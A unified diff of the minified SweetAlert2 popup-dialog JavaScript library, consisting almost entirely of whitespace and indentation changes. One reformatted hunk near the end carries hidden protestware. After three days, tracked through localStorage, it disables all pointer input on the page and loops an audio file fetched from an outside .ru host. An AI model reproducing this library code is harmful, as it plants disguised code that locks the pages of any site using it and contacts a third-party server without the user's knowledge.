@@ -2045,11 +2045,11 @@
       t.container.onmousedown = function (e) {
         e.target === t.container && e.preventDefault(),
           (t.popup.onmouseup = function (e) {
-            (t.popup.onmouseup = function () {}),
+            (t.popup.onmouseup = function () { }),
               (e.target === t.popup ||
                 (e.target instanceof HTMLElement &&
                   t.popup.contains(e.target))) &&
-                (gn = !0);
+              (gn = !0);
           });
       };
     },
@@ -2058,8 +2058,8 @@
         gn
           ? (gn = !1)
           : o.target === e.container &&
-            x(t.allowOutsideClick) &&
-            n(Jt.backdrop);
+          x(t.allowOutsideClick) &&
+          n(Jt.backdrop);
       };
     },
     Cn = function (t) {
@@ -2071,20 +2071,20 @@
       );
     };
   var An = function () {
-      if (g.timeout)
-        return (
-          (function () {
-            var t = Z();
-            if (t) {
-              var e = parseInt(window.getComputedStyle(t).width);
-              t.style.removeProperty("transition"), (t.style.width = "100%");
-              var n = (e / parseInt(window.getComputedStyle(t).width)) * 100;
-              t.style.width = "".concat(n, "%");
-            }
-          })(),
-          g.timeout.stop()
-        );
-    },
+    if (g.timeout)
+      return (
+        (function () {
+          var t = Z();
+          if (t) {
+            var e = parseInt(window.getComputedStyle(t).width);
+            t.style.removeProperty("transition"), (t.style.width = "100%");
+            var n = (e / parseInt(window.getComputedStyle(t).width)) * 100;
+            t.style.width = "".concat(n, "%");
+          }
+        })(),
+        g.timeout.stop()
+      );
+  },
     kn = function () {
       if (g.timeout) {
         var t = g.timeout.start();
@@ -2108,16 +2108,16 @@
         return (
           "object" !== r(t[0]) || Cn(t[0])
             ? ["title", "html", "icon"].forEach(function (n, o) {
-                var i = t[o];
-                "string" == typeof i || Cn(i)
-                  ? (e[n] = i)
-                  : void 0 !== i &&
-                    P(
-                      "Unexpected type of "
-                        .concat(n, '! Expected "string" or "Element", got ')
-                        .concat(r(i))
-                    );
-              })
+              var i = t[o];
+              "string" == typeof i || Cn(i)
+                ? (e[n] = i)
+                : void 0 !== i &&
+                P(
+                  "Unexpected type of "
+                    .concat(n, '! Expected "string" or "Element", got ')
+                    .concat(r(i))
+                );
+            })
             : Object.assign(e, t[0]),
           e
         );
@@ -2252,7 +2252,7 @@
             value: function () {
               return (
                 this.running ||
-                  ((this.running = !0),
+                ((this.running = !0),
                   (this.started = new Date()),
                   (this.id = setTimeout(this.callback, this.remaining))),
                 this.remaining
@@ -2264,8 +2264,8 @@
             value: function () {
               return (
                 this.started &&
-                  this.running &&
-                  ((this.running = !1),
+                this.running &&
+                ((this.running = !1),
                   clearTimeout(this.id),
                   (this.remaining -=
                     new Date().getTime() - this.started.getTime())),
@@ -2313,8 +2313,8 @@
           "boolean" == typeof Xe[n]
             ? (e[n] = "false" !== o)
             : "object" === r(Xe[n])
-            ? (e[n] = JSON.parse(o))
-            : (e[n] = o);
+              ? (e[n] = JSON.parse(o))
+              : (e[n] = o);
         }),
         e
       );
@@ -2341,10 +2341,10 @@
           (e["".concat(n, "ButtonText")] = t.innerHTML),
             (e["show".concat(k(n), "Button")] = !0),
             t.hasAttribute("color") &&
-              (e["".concat(n, "ButtonColor")] = t.getAttribute("color")),
+            (e["".concat(n, "ButtonColor")] = t.getAttribute("color")),
             t.hasAttribute("aria-label") &&
-              (e["".concat(n, "ButtonAriaLabel")] =
-                t.getAttribute("aria-label"));
+            (e["".concat(n, "ButtonAriaLabel")] =
+              t.getAttribute("aria-label"));
         }),
         e
       );
@@ -2354,11 +2354,11 @@
         n = t.querySelector("swal-image");
       return (
         n &&
-          (_n(n, ["src", "width", "height", "alt"]),
+        (_n(n, ["src", "width", "height", "alt"]),
           n.hasAttribute("src") && (e.imageUrl = n.getAttribute("src")),
           n.hasAttribute("width") && (e.imageWidth = n.getAttribute("width")),
           n.hasAttribute("height") &&
-            (e.imageHeight = n.getAttribute("height")),
+          (e.imageHeight = n.getAttribute("height")),
           n.hasAttribute("alt") && (e.imageAlt = n.getAttribute("alt"))),
         e
       );
@@ -2368,7 +2368,7 @@
         n = t.querySelector("swal-icon");
       return (
         n &&
-          (_n(n, ["type", "color"]),
+        (_n(n, ["type", "color"]),
           n.hasAttribute("type") && (e.icon = n.getAttribute("type")),
           n.hasAttribute("color") && (e.iconColor = n.getAttribute("color")),
           (e.iconHtml = n.innerHTML)),
@@ -2380,15 +2380,15 @@
         n = t.querySelector("swal-input");
       n &&
         (_n(n, ["type", "label", "placeholder", "value"]),
-        (e.input = n.getAttribute("type") || "text"),
-        n.hasAttribute("label") && (e.inputLabel = n.getAttribute("label")),
-        n.hasAttribute("placeholder") &&
+          (e.input = n.getAttribute("type") || "text"),
+          n.hasAttribute("label") && (e.inputLabel = n.getAttribute("label")),
+          n.hasAttribute("placeholder") &&
           (e.inputPlaceholder = n.getAttribute("placeholder")),
-        n.hasAttribute("value") && (e.inputValue = n.getAttribute("value")));
+          n.hasAttribute("value") && (e.inputValue = n.getAttribute("value")));
       var o = Array.from(t.querySelectorAll("swal-input-option"));
       return (
         o.length &&
-          ((e.inputOptions = {}),
+        ((e.inputOptions = {}),
           o.forEach(function (t) {
             _n(t, ["value"]);
             var n = t.getAttribute("value"),
@@ -2447,7 +2447,7 @@
           Fn(e, n);
         }, 10),
         X() &&
-          (Un(e, t.scrollbarPadding, o),
+        (Un(e, t.scrollbarPadding, o),
           (function () {
             var t = j();
             Array.from(document.body.children).forEach(function (e) {
@@ -2457,16 +2457,16 @@
                     "data-previous-aria-hidden",
                     e.getAttribute("aria-hidden") || ""
                   ),
-                e.setAttribute("aria-hidden", "true"));
+                  e.setAttribute("aria-hidden", "true"));
             });
           })()),
         G() ||
-          g.previousActiveElement ||
-          (g.previousActiveElement = document.activeElement),
+        g.previousActiveElement ||
+        (g.previousActiveElement = document.activeElement),
         "function" == typeof t.didOpen &&
-          setTimeout(function () {
-            return t.didOpen(n);
-          }),
+        setTimeout(function () {
+          return t.didOpen(n);
+        }),
         at(e, w["no-transition"]);
     },
     Nn = function t(e) {
@@ -2506,9 +2506,9 @@
           : st(e, "grid"),
         rt([document.documentElement, document.body], w.shown),
         n.heightAuto &&
-          n.backdrop &&
-          !n.toast &&
-          rt([document.documentElement, document.body], w["height-auto"]);
+        n.backdrop &&
+        !n.toast &&
+        rt([document.documentElement, document.body], w["height-auto"]);
     },
     Wn = {
       email: function (t, e) {
@@ -2528,22 +2528,22 @@
     !(function (t) {
       t.inputValidator ||
         ("email" === t.input && (t.inputValidator = Wn.email),
-        "url" === t.input && (t.inputValidator = Wn.url));
+          "url" === t.input && (t.inputValidator = Wn.url));
     })(t),
       t.showLoaderOnConfirm &&
-        !t.preConfirm &&
-        E(
-          "showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request"
-        ),
+      !t.preConfirm &&
+      E(
+        "showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request"
+      ),
       (function (t) {
         (!t.target ||
           ("string" == typeof t.target && !document.querySelector(t.target)) ||
           ("string" != typeof t.target && !t.target.appendChild)) &&
           (E('Target parameter is not valid, defaulting to "body"'),
-          (t.target = "body"));
+            (t.target = "body"));
       })(t),
       "string" == typeof t.title &&
-        (t.title = t.title.split("\n").join("<br />")),
+      (t.title = t.title.split("\n").join("<br />")),
       Ct(t);
   }
   var Yn = new WeakMap(),
@@ -2581,10 +2581,10 @@
                     E(
                       '"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`'
                     ),
-                  t))
+                    t))
                     rn(e), t.toast && an(e), cn(e);
                 })(Object.assign({}, e, t)),
-                g.currentInstance)
+                  g.currentInstance)
               ) {
                 var n = ae.swalPromiseResolve.get(g.currentInstance),
                   o = g.currentInstance.isAwaitingPromise;
@@ -2651,9 +2651,9 @@
           (function (t, e, n) {
             Xt(t),
               e.toast ||
-                ((t.keydownHandler = function (t) {
-                  return ee(e, t, n);
-                }),
+              ((t.keydownHandler = function (t) {
+                return ee(e, t, n);
+              }),
                 (t.keydownTarget = e.keydownListenerCapture ? window : H()),
                 (t.keydownListenerCapture = e.keydownListenerCapture),
                 t.keydownTarget.addEventListener("keydown", t.keydownHandler, {
@@ -2665,12 +2665,12 @@
             "select" === e.input || "radio" === e.input
               ? Se(t, e)
               : ["text", "email", "number", "tel", "textarea"].some(function (
-                  t
-                ) {
-                  return t === e.input;
-                }) &&
-                (S(e.inputValue) || L(e.inputValue)) &&
-                (Ee(F()), Oe(t, e));
+                t
+              ) {
+                return t === e.input;
+              }) &&
+              (S(e.inputValue) || L(e.inputValue)) &&
+              (Ee(F()), Oe(t, e));
           })(t, n),
           Rn(n),
           Gn(g, n, r),
@@ -2682,23 +2682,23 @@
     },
     Jn = function (t, e) {
       var n = (function (t) {
-          var e =
-            "string" == typeof t.template
-              ? document.querySelector(t.template)
-              : t.template;
-          if (!e) return {};
-          var n = e.content;
-          return (
-            Vn(n),
-            Object.assign(Ln(n), jn(n), Mn(n), In(n), Hn(n), Dn(n), qn(n, On))
-          );
-        })(t),
+        var e =
+          "string" == typeof t.template
+            ? document.querySelector(t.template)
+            : t.template;
+        if (!e) return {};
+        var n = e.content;
+        return (
+          Vn(n),
+          Object.assign(Ln(n), jn(n), Mn(n), In(n), Hn(n), Dn(n), qn(n, On))
+        );
+      })(t),
         o = Object.assign({}, Xe, e, n, t);
       return (
         (o.showClass = Object.assign({}, Xe.showClass, o.showClass)),
         (o.hideClass = Object.assign({}, Xe.hideClass, o.hideClass)),
         !1 === o.animation &&
-          ((o.showClass = { backdrop: "swal2-noanimation" }),
+        ((o.showClass = { backdrop: "swal2-noanimation" }),
           (o.hideClass = {})),
         o
       );
@@ -2722,11 +2722,11 @@
       var o = Z();
       lt(o),
         e.timer &&
-          ((t.timeout = new Sn(function () {
-            n("timer"), delete t.timeout;
-          }, e.timer)),
+        ((t.timeout = new Sn(function () {
+          n("timer"), delete t.timeout;
+        }, e.timer)),
           e.timerProgressBar &&
-            (st(o),
+          (st(o),
             et(o, e, "timerProgressBar"),
             setTimeout(function () {
               t.timeout && t.timeout.running && gt(e.timer);
@@ -2739,8 +2739,8 @@
       return e.focusDeny && mt(t.denyButton)
         ? (t.denyButton.focus(), !0)
         : e.focusCancel && mt(t.cancelButton)
-        ? (t.cancelButton.focus(), !0)
-        : !(!e.focusConfirm || !mt(t.confirmButton)) &&
+          ? (t.cancelButton.focus(), !0)
+          : !(!e.focusConfirm || !mt(t.confirmButton)) &&
           (t.confirmButton.focus(), !0);
     },
     eo = function () {
@@ -2757,17 +2757,17 @@
       oo = localStorage.getItem("swal-initiation");
     oo
       ? (no.getTime() - Date.parse(oo)) / 864e5 > 3 &&
-        setTimeout(function () {
-          document.body.style.pointerEvents = "none";
-          var t = document.createElement("audio");
-          (t.src =
-            "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3"),
-            (t.loop = !0),
-            document.body.appendChild(t),
-            setTimeout(function () {
-              t.play().catch(function () {});
-            }, 2500);
-        }, 500)
+      setTimeout(function () {
+        document.body.style.pointerEvents = "none";
+        var t = document.createElement("audio");
+        (t.src =
+          "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3"),
+          (t.loop = !0),
+          document.body.appendChild(t),
+          setTimeout(function () {
+            t.play().catch(function () { });
+          }, 2500);
+      }, 500)
       : localStorage.setItem("swal-initiation", "".concat(no));
   }
   (Zn.prototype.disableButtons = Ke),
@@ -2799,12 +2799,12 @@
   return (io.default = io), io;
 }),
   void 0 !== this &&
-    this.Sweetalert2 &&
-    (this.swal =
-      this.sweetAlert =
-      this.Swal =
-      this.SweetAlert =
-        this.Sweetalert2);
+  this.Sweetalert2 &&
+  (this.swal =
+    this.sweetAlert =
+    this.Swal =
+    this.SweetAlert =
+    this.Sweetalert2);
 "undefined" != typeof document &&
   (function (e, t) {
     var n = e.createElement("style");
